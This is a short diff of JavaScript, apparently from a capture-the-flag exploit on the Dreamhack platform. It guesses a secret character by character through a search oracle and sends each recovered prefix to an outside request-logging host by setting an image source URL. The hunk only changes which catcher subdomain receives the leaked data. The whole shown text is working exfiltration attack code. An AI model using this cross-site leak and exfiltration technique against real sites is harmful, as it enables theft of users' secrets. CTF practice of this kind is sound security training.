@@ -34,7 +34,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://lsyvouq.request.dreamhack.games/${secret}`;
+                    img.src = `https://urmgeqs.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
